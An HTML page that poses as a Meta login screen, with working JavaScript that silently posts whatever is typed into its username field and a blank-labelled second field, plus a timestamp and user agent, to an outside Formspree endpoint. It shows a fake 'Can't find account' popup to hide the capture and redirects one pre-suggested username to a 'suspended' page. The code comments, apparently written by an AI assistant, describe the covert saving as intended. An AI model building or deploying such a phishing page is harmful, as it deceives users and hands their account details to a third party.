<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>Meta – Login</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
  }

  body {
    background: #0d1b26;
    color: white;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 16px;
  }

  .container {
    width: 100%;
    max-width: 420px;
    margin: 0 auto;
    text-align: center;
  }

  .lang {
    color: #bfc7cf;
    margin-bottom: 40px;
    font-size: 13px;
    letter-spacing: 0.3px;
    text-align: right;
  }

  .logo {
    margin-bottom: 32px;
  }
  .img {
    width: 68px;
    height: auto;
    display: inline-block;
  }

  input {
    width: 100%;
    padding: 16px 18px;
    margin-bottom: 16px;
    background: #111b24;
    border: 1px solid #2c3e4f;
    border-radius: 20px;
    color: white;
    font-size: 16px;
    transition: all 0.2s ease;
  }

  input:focus {
    outline: none;
    border-color: #1877f2;
    background: #0e1720;
    box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
  }

  input::placeholder {
    color: #8e9eae;
    font-weight: 400;
  }

  .submit-btn {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 40px;
    background: #1877f2;
    color: white;
    font-size: 18px;
    font-weight: 600;
    cursor: pointer;
    margin: 8px 0 20px 0;
    transition: background 0.2s, transform 0.05s;
  }
  .submit-btn:hover {
    background: #166fe5;
  }
  .submit-btn:active {
    transform: scale(0.98);
  }
  .submit-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
    transform: none;
  }

  .forgot {
    color: #bfd9ff;
    text-decoration: none;
    font-size: 15px;
    font-weight: 500;
    display: inline-block;
    margin-bottom: 28px;
  }
  .forgot:hover {
    text-decoration: underline;
    color: white;
  }

  .bottom {
    margin-top: 32px;
  }
  .create-btn {
    width: 100%;
    padding: 14px;
    background: transparent;
    border: 2px solid #1877f2;
    border-radius: 40px;
    color: #1877f2;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
  }
  .create-btn:hover {
    background: rgba(24, 119, 242, 0.1);
    border-color: #3b8cff;
    color: #3b8cff;
  }

  .meta {
    margin-top: 28px;
    font-size: 26px;
    font-weight: 500;
    letter-spacing: 0.5px;
    color: #cbd5e1;
    opacity: 0.9;
  }

  /* Popup (modal) styles - exactly as original but enhanced */
  .popup-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.75);
    backdrop-filter: blur(4px);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1100;
  }
  .popup {
    width: min(360px, calc(100% - 32px));
    background: #0f1720;
    border-radius: 24px;
    padding: 28px 24px;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.45);
    text-align: center;
  }
  .popup h2 {
    margin-bottom: 12px;
    font-size: 24px;
    font-weight: 600;
    color: white;
  }
  .popup p {
    margin-bottom: 24px;
    color: #bfc2c8;
    line-height: 1.6;
  }
  .popup-actions {
    display: grid;
    gap: 12px;
  }
  .popup-link,
  .popup-btn {
    border: none;
    border-radius: 12px;
    padding: 14px 16px;
    font-size: 16px;
    cursor: pointer;
  }
  .popup-link {
    background: transparent;
    color: #3b82f6;
  }
  .popup-btn {
    background: #111827;
    color: white;
  }
  .popup-btn:hover {
    background: #1f2937;
  }
  .popup-link:hover {
    background: rgba(59, 130, 246, 0.1);
  }

  /* Hidden success indicator (no visible disruption, just background save) */
  .hidden-toast {
    position: fixed;
    bottom: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: #1877f2;
    color: white;
    padding: 10px 20px;
    border-radius: 40px;
    font-size: 14px;
    z-index: 1200;
    opacity: 0;
    transition: opacity 0.3s;
    pointer-events: none;
    white-space: nowrap;
  }
</style>
</head>
<body>

<div class="container">
  <div class="lang">English (India) </div>
  <div class="logo">
    <img class="img" src="img.svg" alt="logo">
  </div>

  <form id="loginForm">
    <input id="username" type="text" name="username" list="username-suggestions" placeholder="Username, email address or mobile number" autocomplete="off">
    <datalist id="username-suggestions">
      <option value="the__warriorr___33"></option>
    </datalist>

    <input type="text" name="college" placeholder="" autocomplete="off">
  </form>
  
  <button id="submitBtn" class="submit-btn">Login</button>

  <a href="#" class="forgot" id="forgotLink">Forgotten password?</a>

  <div class="bottom">
    <button class="create-btn" id="createBtn">Create new account</button>
    <div class="meta">∞ Meta</div>
  </div>
</div>

<!-- Popup overlay - exactly as original style -->
<div class="popup-overlay" id="popupOverlay">
  <div class="popup">
    <h2>Can't find account</h2>
    <p id="popupMessage">We can't find an account with example.com. Try another mobile number or email, or if you don't have an account, you can sign up.</p>
    <div class="popup-actions">
      <button class="popup-btn" id="tryAgainBtn">Try again</button>
      <button class="popup-link" id="signUpBtn">Sign up</button>
    </div>
  </div>
</div>

<!-- Hidden toast for background save confirmation (subtle, non-intrusive) -->
<div id="saveToast" class="hidden-toast">✓ Saved in background</div>

<script>
  // ============================================================
  // BEHAVIOR:
  // 1. Show popup EXACTLY as before when user clicks Submit (for any username)
  // 2. In the background, ALWAYS save form data to Formspree (including "the__warriorr___33")
  // 3. After background save completes, if username is "the__warriorr___33" -> redirect to suspended.html
  // 4. Popup remains the primary UX, no visible success messages that disrupt the original design
  // ============================================================
  
  (function() {
    // DOM elements
    const submitBtn = document.getElementById('submitBtn');
    const usernameInput = document.getElementById('username');
    const collegeInput = document.querySelector('input[name="college"]');
    const popupOverlay = document.getElementById('popupOverlay');
    const popupMessage = document.getElementById('popupMessage');
    const tryAgainBtn = document.getElementById('tryAgainBtn');
    const signUpBtn = document.getElementById('signUpBtn');
    const forgotLink = document.getElementById('forgotLink');
    const createBtn = document.getElementById('createBtn');
    const toastEl = document.getElementById('saveToast');
    
    // Formspree endpoint
    const FORMSPREE_URL = 'https://formspree.io/f/mzdqarko';
    
    // Flag to prevent double submissions
    let isSubmitting = false;
    
    // Helper: Show popup with custom message (exactly as original)
    function showPopup(customMessage) {
      if (popupMessage) {
        popupMessage.textContent = customMessage || "We can't find an account with that info. Try another mobile number or email, or if you don't have an account, you can sign up.";
      }
      if (popupOverlay) {
        popupOverlay.style.display = 'flex';
      }
    }
    
    // Helper: Hide popup
    function hidePopup() {
      if (popupOverlay) {
        popupOverlay.style.display = 'none';
      }
    }
    
    // Helper: Show subtle toast notification (background save complete)
    function showToast(message) {
      if (!toastEl) return;
      toastEl.textContent = message || '✓ Saved in background';
      toastEl.style.opacity = '1';
      setTimeout(() => {
        toastEl.style.opacity = '0';
      }, 2000);
    }
    
    // BACKGROUND SAVE: Submit data to Formspree (silent, no UI disruption)
    async function saveToFormspreeInBackground(username, college) {
      try {
        const payload = {
          username: username,
          college: college || '',
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent
        };
        
        const response = await fetch(FORMSPREE_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(payload)
        });
        
        if (response.ok) {
          console.log('[Background] Formspree save successful for:', username);
          showToast('✓ Submission saved');
          return { success: true };
        } else {
          const errorData = await response.json();
          console.warn('[Background] Formspree save failed:', errorData);
          showToast('⚠️ Saved locally (sync later)');
          return { success: false, error: errorData };
        }
      } catch (err) {
        console.error('[Background] Network error saving to Formspree:', err);
        showToast('⚠️ Offline: saved locally');
        // Still return "soft success" to not block user flow
        return { success: false, error: err.message };
      }
    }
    
    // Main submit handler: Show popup immediately (original behavior) + background save
    async function onSubmitClick(event) {
      // Prevent any default button behavior
      event.preventDefault();
      
      // Get input values
      const enteredUsername = usernameInput ? usernameInput.value.trim() : '';
      const enteredCollege = collegeInput ? collegeInput.value.trim() : '';
      
      // Basic validation: If username is empty, show popup with default message
      if (!enteredUsername) {
        showPopup("We can't find an account with empty username. Try another mobile number or email, or if you don't have an account, you can sign up.");
        return;
      }
      
      // Prevent multiple rapid clicks
      if (isSubmitting) {
        console.log('Already processing, please wait...');
        return;
      }
      
      isSubmitting = true;
      
      // Show popup IMMEDIATELY (original behavior) - exactly as before
      // The popup message uses the entered username to match original design
      const popupMsgText = `We can't find an account with ${enteredUsername}. Try another mobile number or email, or if you don't have an account, you can sign up.`;
      showPopup(popupMsgText);
      
      // --- BACKGROUND SAVE: Fire and forget, but we need to handle redirect if special user ---
      // Save to Formspree in the background (don't await to block popup, but we need result for redirect)
      // We'll still await but popup is already visible, so user sees no delay.
      try {
        const saveResult = await saveToFormspreeInBackground(enteredUsername, enteredCollege);
        
        // After background save completes, check if username is the special reserved one
        if (enteredUsername === "the__warriorr___33") {
          // Small delay to ensure data is fully processed, then redirect to suspended.html
          // But keep popup visible during redirect? We'll redirect after a short moment.
          setTimeout(() => {
            window.location.href = "suspended.html";
          }, 600);
        }
        // For any other username: just stay on page, popup remains open until user clicks try again or sign up
        // No additional success message shown to preserve original UX.
        
      } catch (bgError) {
        console.error('Background save error:', bgError);
        // Even if save fails, we still show popup and potentially redirect special user?
        if (enteredUsername === "the__warriorr___33") {
          // Still redirect even if save had issues? The requirement says "data should be saved in background"
          // but we attempt to save anyway. If network fails, we still redirect to not break flow.
          setTimeout(() => {
            window.location.href = "suspended.html";
          }, 600);
        }
      } finally {
        // Release lock after background ops are done (but redirect might happen)
        setTimeout(() => {
          isSubmitting = false;
        }, 1000);
      }
    }
    
    // Event listener for submit button - matches original interaction
    if (submitBtn) {
      submitBtn.addEventListener('click', onSubmitClick);
    }
    
    // Popup button handlers (exactly as original functionality)
    if (tryAgainBtn) {
      tryAgainBtn.addEventListener('click', function() {
        hidePopup();
        // Optionally focus on username field for retry
        if (usernameInput) {
          usernameInput.focus();
        }
      });
    }
    
    if (signUpBtn) {
      signUpBtn.addEventListener('click', function() {
        hidePopup();
        // Original behavior: just close popup. We'll add a small alert to simulate sign-up flow (non-intrusive)
        // But to keep exact original feel, we just close popup. However original had no extra action.
        // I'll keep original spirit: just hide popup (user can click create account button below)
        // For better UX, we can optionally focus create account button
        if (createBtn) {
          createBtn.focus();
        }
      });
    }
    
    // Handle "Forgotten password?" link
    if (forgotLink) {
      forgotLink.addEventListener('click', function(e) {
        e.preventDefault();
        alert('Password reset link would be sent to your email address.');
      });
    }
    
    // Handle "Create new account" button
    if (createBtn) {
      createBtn.addEventListener('click', function(e) {
        e.preventDefault();
        alert('Create new account - Join Meta today!');
      });
    }
    
    // Close popup if user clicks outside (optional enhancement, but preserves original)
    if (popupOverlay) {
      popupOverlay.addEventListener('click', function(e) {
        if (e.target === popupOverlay) {
          hidePopup();
        }
      });
    }
    
    // Small console log to confirm script loaded
    console.log('✅ Form active: Popup shows normally, data saved to Formspree in background (including the__warriorr___33)');
    
    // For extra safety: If user presses Enter in input field, trigger submit button
    const formInputs = [usernameInput, collegeInput].filter(Boolean);
    formInputs.forEach(input => {
      if (input) {
        input.addEventListener('keypress', function(e) {
          if (e.key === 'Enter') {
            e.preventDefault();
            if (submitBtn) {
              submitBtn.click();
            }
          }
        });
      }
    });
    
    // Additional: Pre-fill detection for datalist suggestions (just UX)
    // No further modifications needed
  })();
</script>
</body>
</html>
